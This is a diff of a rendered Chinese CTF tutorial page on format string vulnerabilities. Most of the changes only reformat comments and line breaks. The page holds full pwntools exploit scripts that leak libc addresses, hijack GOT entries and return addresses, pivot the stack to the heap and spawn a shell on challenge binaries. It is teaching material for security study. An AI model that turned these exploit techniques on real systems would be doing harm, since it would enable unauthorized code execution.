@@ -145,6 +145,9 @@
 <li class="toctree-l3"><a class="reference internal" href="#hijack-got">hijack GOT</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#id9">原理</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id10">例子</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#hijack-retaddr">hijack retaddr</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#id15">原理</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id16">例子</a></li>
 </ul>
@@ -246,8 +249,7 @@
 </div>
 <div class="section" id="id4">
 <h3>例子<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h3>
-<p>这里，我们以2017年的UIUCTF中pwn200
-GoodLuck为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个flag.txt文件。</p>
+<p>这里，我们以2017年的UIUCTF中pwn200 GoodLuck为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个flag.txt文件。</p>
 <div class="section" id="id5">
 <h4>确定保护<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
 <div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
@@ -336,7 +338,7 @@ The index of format argument : 10
     <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s&quot;</span>
 <span class="nb">print</span> <span class="n">payload</span>
-<span class="c1">#gdb.attach(sh)</span>
+<span class="c1">##gdb.attach(sh)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
@@ -354,28 +356,37 @@ The index of format argument : 10
 <p>假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤</p>
 <ul>
 <li><p class="first">确定函数A的GOT表地址。</p>
-</li>
-<li><p class="first">这一步我们利用的函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</p>
+<blockquote>
+<div><ul class="simple">
+<li>这一步我们利用的函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li>
+</ul>
+</div></blockquote>
 </li>
 <li><p class="first">确定函数B的内存地址</p>
-</li>
-<li><p class="first">这一步通常来说，需要我们自己想办法来泄露对应函数B的地址。</p>
+<blockquote>
+<div><ul class="simple">
+<li>这一步通常来说，需要我们自己想办法来泄露对应函数B的地址。</li>
+</ul>
+</div></blockquote>
 </li>
 <li><p class="first">将函数B的内存地址写入到函数A的GOT表地址处。</p>
-</li>
+<blockquote>
+<div><ul>
 <li><p class="first">这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
-<ul class="simple">
-<li>写入函数：write函数。</li>
-<li>ROP</li>
-</ul>
+</li>
+<li><p class="first">写入函数：write函数。</p>
+</li>
+<li><p class="first">ROP</p>
 <div class="code text highlight-default"><div class="highlight"><pre><span></span><span class="n">pop</span> <span class="n">eax</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>           <span class="c1"># printf@got -&gt; eax</span>
 <span class="n">pop</span> <span class="n">ebx</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>           <span class="c1"># (addr_offset = system_addr - printf_addr) -&gt; ebx</span>
 <span class="n">add</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span> <span class="n">ebx</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>     <span class="c1"># [printf@got] = [printf@got] + addr_offset</span>
 </pre></div>
 </div>
-<ul class="simple">
-<li>格式化字符串任意地址写</li>
+</li>
+<li><p class="first">格式化字符串任意地址写</p>
+</li>
 </ul>
+</div></blockquote>
 </li>
 </ul>
 </div>
@@ -437,7 +448,7 @@ The index of format argument : 10
 <p>如下</p>
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="k">import</span> <span class="n">LibcSearcher</span>
-<span class="c1">#context.log_level = &#39;debug&#39;</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
 <span class="n">pwn3</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
 <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
     <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>
@@ -471,37 +482,37 @@ The index of format argument : 10
     <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
 
 
-<span class="c1"># password</span>
+<span class="c1">## password</span>
 <span class="k">def</span> <span class="nf">password</span><span class="p">():</span>
     <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name (ftp.hacker.server:Rainism):&#39;</span><span class="p">)</span>
     <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
 
 
-<span class="c1">#password</span>
+<span class="c1">##password</span>
 <span class="n">password</span><span class="p">()</span>
-<span class="c1"># get the addr of puts</span>
+<span class="c1">## get the addr of puts</span>
 <span class="n">puts_got</span> <span class="o">=</span> <span class="n">pwn3</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts got : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
 <span class="n">put</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>
 <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
 
-<span class="c1"># get addr of system</span>
+<span class="c1">## get addr of system</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&quot;puts&quot;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
 <span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
 <span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">puts_offset</span> <span class="o">+</span> <span class="n">system_offset</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 
-<span class="c1"># modify puts@got, point to system_addr</span>
+<span class="c1">## modify puts@got, point to system_addr</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">})</span>
 <span class="n">put</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ftp&gt;&#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>
-<span class="c1">#gdb.attach(sh)</span>
+<span class="c1">##gdb.attach(sh)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
 
-<span class="c1"># system(&#39;/bin/sh&#39;)</span>
+<span class="c1">## system(&#39;/bin/sh&#39;)</span>
 <span class="n">show_dir</span><span class="p">()</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
@@ -509,15 +520,14 @@ The index of format argument : 10
 <p>注意</p>
 <ul class="simple">
 <li>我在获取puts函数地址时使用的偏移是8，这是因为我希望我输出的前4个字节就是puts函数的地址。其实格式化字符串的首地址的偏移是7。</li>
-<li>这里我利用了pwntools中的fmtstr_payload函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里fmtstr_payload(7,
-{puts_got:
+<li>这里我利用了pwntools中的fmtstr_payload函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里fmtstr_payload(7, {puts_got:
 system_addr})的意思就是，我的格式化字符串的偏移是7，我希望在puts_got地址处写入system_addr地址。默认情况下是按照字节来写的。</li>
 </ul>
+</div>
+</div>
+</div>
 <div class="section" id="hijack-retaddr">
-<h5>hijack retaddr<a class="headerlink" href="#hijack-retaddr" title="永久链接至标题">¶</a></h5>
-</div>
-</div>
-</div>
+<h2>hijack retaddr<a class="headerlink" href="#hijack-retaddr" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id15">
 <h3>原理<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
 <p>很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p>
@@ -535,8 +545,7 @@ system_addr})的意思就是，我的格式化字符串的偏移是7，我希望
     PIE:      No PIE (0x400000)
 </pre></div>
 </div>
-<p>可以看出程序主要开启了NX保护以及Full
-RELRO保护。这我们就没有办法修改程序的got表了。</p>
+<p>可以看出程序主要开启了NX保护以及Full RELRO保护。这我们就没有办法修改程序的got表了。</p>
 </div>
 <div class="section" id="id18">
 <h4>分析程序<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
@@ -583,8 +592,7 @@ RELRO保护。这我们就没有办法修改程序的got表了。</p>
 </div>
 <div class="section" id="id20">
 <h4>确定偏移<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h4>
-<p>首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&amp;a4
-+ 4)函数处</p>
+<p>首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&amp;a4 + 4)函数处</p>
 <div class="code text highlight-default"><div class="highlight"><pre><span></span>Register Account first!
 Input your username(max lenth:20):
 aaaaaaaa
@@ -638,8 +646,7 @@ Register Success!!
 0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
 </pre></div>
 </div>
-<p>可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用showaccounth函数时执行push
-rip所存储的值)，在格式化字符串中的偏移为7。</p>
+<p>可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用showaccounth函数时执行push rip所存储的值)，在格式化字符串中的偏移为7。</p>
 <p>与此同时栈上，第一个元素存储的也就是上一个函数的rbp。所以我们可以得到偏移0x00007fffffffdb80-0x00007fffffffdb48=0x38。继而如果我们知道了rbp的数值，就知道了函数返回地址的地址。</p>
 <p>0x0000000000400d74与0x00000000004008A6只有低2字节不同，所以我们可以只修改0x00007fffffffdb48开始的2个字节。</p>
 </div>
@@ -721,8 +728,7 @@ rip所存储的值)，在格式化字符串中的偏移为7。</p>
 <p>我们的基本目的是获取系统的shell，从而拿到flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持got表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下</p>
 <ul class="simple">
 <li>之所以不能够劫持got来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有printf函数，我们只有选择它才可以构造/bin/sh让它执行system(‘/bin/sh’)，但是printf函数在其他地方也均有用到，这样做会使得程序直接崩溃。</li>
-<li>其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入system_addr+’bbbb’+addr
-of ‘/bin/sh‘似乎并不现实。</li>
+<li>其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入system_addr+’bbbb’+addr of ‘/bin/sh‘似乎并不现实。</li>
 </ul>
 <p>那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack
 privot。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过leave指令来进行栈迁移，所以在迁移之前我们需要修改程序保存ebp的值为我们想要的值。
@@ -730,8 +736,7 @@ privot。而这里，我们可以控制的恰好是堆内存，所以我们可�
 <p>基本思路如下</p>
 <ul class="simple">
 <li>首先获取system函数的地址</li>
-<li>通过泄露某个libc函数的地址根据libc
-database确定。</li>
+<li>通过泄露某个libc函数的地址根据libc database确定。</li>
 <li>构造基本联系人描述为system_addr+’bbbb’+binsh_addr</li>
 <li>修改上层函数保存的ebp(即上上层函数的ebp)为<strong>存储system_addr的地址-4</strong>。</li>
 <li>当主程序返回时，会有如下操作</li>
@@ -840,8 +845,7 @@ The index of format argument : 32
 </div>
 <div class="section" id="ebp">
 <h4>修改ebp<a class="headerlink" href="#ebp" title="永久链接至标题">¶</a></h4>
-<p>由于我们需要执行move指令将ebp赋给esp，并还需要执行pop
-ebp才会执行ret指令，所以我们需要将ebp修改为存储system地址-4的值。这样pop
+<p>由于我们需要执行move指令将ebp赋给esp，并还需要执行pop ebp才会执行ret指令，所以我们需要将ebp修改为存储system地址-4的值。这样pop
 ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即可执行system函数。</p>
 <p>上面已经得知了我们希望修改的ebp值，而也知道了对应的偏移为11，所以我们可以构造如下的payload来进行修改相应的值。</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
@@ -859,7 +863,7 @@ ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即�
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="k">import</span> <span class="o">*</span>
 <span class="n">contact</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>
-<span class="c1">#context.log_level = &#39;debug&#39;</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
 <span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
     <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
@@ -887,7 +891,7 @@ ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即�
     <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
 
 
-<span class="c1"># get system addr &amp; binsh_addr</span>
+<span class="c1">## get system addr &amp; binsh_addr</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%31$paaaa&#39;</span>
 <span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 <span class="n">printcontact</span><span class="p">()</span>
@@ -899,9 +903,9 @@ ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即�
 <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get binsh addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
-<span class="c1">#gdb.attach(sh)</span>
+<span class="c1">##gdb.attach(sh)</span>
 
-<span class="c1"># get heap addr and ebp addr</span>
+<span class="c1">## get heap addr and ebp addr</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
     <span class="n">system_addr</span><span class="p">,</span>
     <span class="s1">&#39;bbbb&#39;</span><span class="p">,</span>
@@ -917,19 +921,19 @@ ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即�
 <span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 <span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 
-<span class="c1"># modify ebp</span>
+<span class="c1">## modify ebp</span>
 <span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
 <span class="n">part2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">part1</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%6$n&#39;</span>
-<span class="c1">#print payload</span>
+<span class="c1">##print payload</span>
 <span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;3333&#39;</span><span class="p">,</span> <span class="s1">&#39;123456789&#39;</span><span class="p">,</span> <span class="s1">&#39;300&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 <span class="n">printcontact</span><span class="p">()</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
-<span class="c1">#gdb.attach(sh)</span>
+<span class="c1">##gdb.attach(sh)</span>
 <span class="nb">print</span> <span class="s1">&#39;get shell&#39;</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
-<span class="c1">#get shell</span>
+<span class="c1">##get shell</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
@@ -1024,11 +1028,11 @@ aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x6161616161616161
 </div>
 <div class="section" id="binary">
 <h4>泄露binary<a class="headerlink" href="#binary" title="永久链接至标题">¶</a></h4>
-<p>由于程序是64位，所以我们从0x400000处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入 ‘x00’ 字符的，，不然没法泄露怎么玩，，除此之后，输出必然是 ‘x00’ 截断的，这是因为格式化字符串漏洞利用的输出函数均是 ‘x00’ 截断的。。所以我们可以利用如下的泄露代码。</p>
-<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">#coding=utf8</span>
+<p>由于程序是64位，所以我们从0x400000处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入\x00字符的，，不然没法泄露怎么玩，，除此之后，输出必然是\x00截断的，这是因为格式化字符串漏洞利用的输出函数均是\x00截断的。。所以我们可以利用如下的泄露代码。</p>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">##coding=utf8</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
 
-<span class="c1">#context.log_level = &#39;debug&#39;</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
 <span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
 
@@ -1071,7 +1075,7 @@ aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x6161616161616161
 <span class="n">getbinary</span><span class="p">()</span>
 </pre></div>
 </div>
-<p>需要注意的是，在payload中需要判断是否有 ‘n’ 出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。</p>
+<p>需要注意的是，在payload中需要判断是否有\n出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。</p>
 </div>
 <div class="section" id="id39">
 <h4>分析binary<a class="headerlink" href="#id39" title="永久链接至标题">¶</a></h4>
@@ -1113,11 +1117,11 @@ seg000:0000000000400639                 jmp     short loc_4005FE
 <div class="section" id="id41">
 <h4>利用程序<a class="headerlink" href="#id41" title="永久链接至标题">¶</a></h4>
 <p>程序如下。</p>
-<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">#coding=utf8</span>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">##coding=utf8</span>
 <span class="kn">import</span> <span class="nn">math</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="k">import</span> <span class="n">LibcSearcher</span>
-<span class="c1">#context.log_level = &#39;debug&#39;</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
 <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
 <span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
@@ -1161,29 +1165,29 @@ seg000:0000000000400639                 jmp     short loc_4005FE
     <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
 
-<span class="c1">#getbinary()</span>
+<span class="c1">##getbinary()</span>
 <span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x601020</span>
 <span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-<span class="c1"># let the read get resolved</span>
+<span class="c1">## let the read get resolved</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="c1"># get printf addr</span>
+<span class="c1">## get printf addr</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%00008$s&#39;</span> <span class="o">+</span> <span class="s1">&#39;STARTEND&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;STARTEND&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 <span class="n">read_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 
-<span class="c1"># get system addr</span>
+<span class="c1">## get system addr</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="n">read_addr</span><span class="p">)</span>
 <span class="n">libc_base</span> <span class="o">=</span> <span class="n">read_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;read   addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">read_addr</span><span class="p">))</span>
-<span class="c1"># modify printf_got</span>
+<span class="c1">## modify printf_got</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
-<span class="c1"># get all the addr</span>
+<span class="c1">## get all the addr</span>
 <span class="n">addr</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%32d</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">32</span><span class="p">:]</span>
 <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
@@ -1197,15 +1201,15 @@ seg000:0000000000400639                 jmp     short loc_4005FE
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 
-<span class="c1"># get shell</span>
+<span class="c1">## get shell</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
 </div>
 <p>这里需要注意的是这一段代码</p>
-<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1"># modify printf_got</span>
+<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="c1">## modify printf_got</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
-<span class="c1"># get all the addr</span>
+<span class="c1">## get all the addr</span>
 <span class="n">addr</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%32d</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">32</span><span class="p">:]</span>
